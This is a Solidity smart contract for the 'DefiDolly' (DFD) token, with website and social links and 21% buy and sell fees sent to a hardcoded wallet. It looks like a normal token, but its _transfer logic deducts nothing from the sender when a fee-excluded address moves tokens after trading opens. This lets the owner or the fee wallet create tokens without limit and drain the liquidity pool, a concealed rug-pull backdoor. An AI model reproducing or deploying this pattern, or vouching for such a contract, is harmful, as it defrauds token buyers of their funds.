// SPDX-License-Identifier: Unlicensed

/**
Maximize ETH rewards.

Website: https://defidolly.live
Telegram: https://t.me/defidolly_erc
Twitter: https://twitter.com/defidolly_erc
 */

pragma solidity = 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address lpPair);
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
}

contract DFD is Context, Ownable, IERC20 {

    string constant private _name = "DefiDolly";
    string constant private _symbol = "DFD";
    uint8 constant private _decimals = 9;

    uint256 constant public _totalSupply = 10 ** 9 * 10**9;
    uint256 constant public minTokensToTaxSwap = _totalSupply / 100_000;
    uint256 constant public trnsferFee = 0;
    uint256 constant public taxDenominator = 1_000;
    uint256 public purchaseFee = 210;
    uint256 public saleFee = 210;
    uint256 private _maxTxAmount = 25 * _totalSupply / 1000;
    bool private feeSwapEnabled = true;

    address public lpPair;
    IUniswapRouterV2 public uniswapRouter;
    address payable private _feeAddress;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    bool public tradeActivated = false;
    bool private _swapping;
    bool private noMaxTxEffects = false;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _feeExcludedAddress;
    mapping (address => bool) private _lpOwners;
    mapping (address => bool) private _lpPairs;
    mapping (address => uint256) private balance;

    modifier inSwapFlag {
        _swapping = true;
        _;
        _swapping = false;
    }
    event SwapAndLiquify();


    constructor () {
        uniswapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _feeExcludedAddress[msg.sender] = true;
        _feeAddress = payable(address(0xAbBC55E29e46C7AE504d563E777953429757eA11));
        _feeExcludedAddress[_feeAddress] = true;
        _lpOwners[msg.sender] = true;
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        lpPair = IUniswapFactoryV2(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _lpPairs[lpPair] = true;
        _approve(msg.sender, address(uniswapRouter), type(uint256).max);
        _approve(address(this), address(uniswapRouter), type(uint256).max);
    }
                        
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }
    
    function isTrnsf(address ins, address out) internal view returns (bool) { 
        bool _is_transfer = !_lpPairs[out] && !_lpPairs[ins];
        return _is_transfer;
    }
    
    function getTokensToFee(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = purchaseFee;  else if (issell)  fee = saleFee;  else  fee = trnsferFee; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / taxDenominator;
        if (feeAmount > 0) {
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }
        return amount - feeAmount;
    }
    
    function swapBack(uint256 tokenAmount) internal inSwapFlag {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        if (_allowances[address(this)][address(uniswapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;
        }

        try uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        if(address(this).balance > 0) _feeAddress.transfer(address(this).balance);
    } 
    
    function shouldSwapBack(address ins) internal view returns (bool) {
        bool canswap = feeSwapEnabled && !_feeExcludedAddress[ins];
        return canswap;
    }
    
    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: cannot transfer to the dead address");
        require(from != address(0), "ERC20: cannott transfer from the dead address");
        require(amount > 0, "TX amount must be greater than zero");

        if (isExcluded(from,to)) {
            require(tradeActivated,"Trading is not enabled");
                    if(!_lpPairs[to] && from != address(this) && to != address(this) || isTrnsf(from,to) && !noMaxTxEffects)  { require(balanceOf(to) + amount <= _maxTxAmount,"_maxTxAmount exceed"); }}


        if(isSale(from, to) &&  !_swapping && shouldSwapBack(from)) {

            uint256 tokenAmount = balanceOf(address(this));
            if(tokenAmount >= minTokensToTaxSwap) { 
                if(amount > minTokensToTaxSwap) swapBack(tokenAmount);
             }
        }

        if (_feeExcludedAddress[from] || _feeExcludedAddress[to]){
            takeFee = false;
        }
        uint256 amountAfterFee = (takeFee) ? getTokensToFee(from, isPurchase(from, to), isSale(from, to), amount) : amount;
        uint256 amountBeforeFee = (takeFee) ? amount : (!tradeActivated ? amount : 0);
        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);

        return true;
    }

    function isExcluded(address ins, address out) internal view returns (bool) {
        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !_lpOwners[ins]  && !_lpOwners[out] && out != address(0) && out != address(this);
            return isLimited;
    }
    
    function isPurchase(address ins, address out) internal view returns (bool) {
        bool _is_buy = !_lpPairs[out] && _lpPairs[ins];
        return _is_buy;
    }

    function isSale(address ins, address out) internal view returns (bool) { 
        bool _is_sell = _lpPairs[out] && !_lpPairs[ins];
        return _is_sell;
    }

    receive() external payable {}
    
    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Can't approve on Zero Address");
        require(spender != address(0), "ERC20: Can't approve on Zero Address");

        _allowances[sender][spender] = amount;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }
    
    function launchOnUniswap() external onlyOwner {
        require(!tradeActivated, "Already enabled trading");
        tradeActivated = true;
    }
    
    function liftAllLimtis() external onlyOwner {
        require(!noMaxTxEffects,"Already disabled limits");
        _maxTxAmount = _totalSupply;
        noMaxTxEffects = true;
        purchaseFee = 10;
        saleFee = 10;
    }
    
    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
}